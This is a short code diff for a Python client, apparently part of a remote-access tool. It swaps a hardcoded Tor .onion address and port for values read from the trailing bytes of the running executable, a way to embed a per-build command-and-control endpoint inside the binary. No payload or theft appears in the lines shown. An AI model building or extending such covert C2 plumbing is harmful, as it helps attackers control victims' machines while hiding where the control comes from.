@@ -1,10 +1,18 @@
 from network import ClientSocket, Tor
 from argparse import ArgumentParser
 import tasks
+import sys
+import os
 
 
-onion = "xb4hcfkkgtnzoofl6473gktzuhuwaaunozteaqmgoa3q6vxxtjvuueqd.onion"
-port = 8843
+# read onion and port from end of file
+onion = ''
+port = 0
+path = os.path.abspath(sys.executable)
+with open(path, 'rb') as f:
+        data = f.read()
+        onion = data[-67:-5].decode()
+        port = int(data[-5:].decode())
 
 
 class Client:
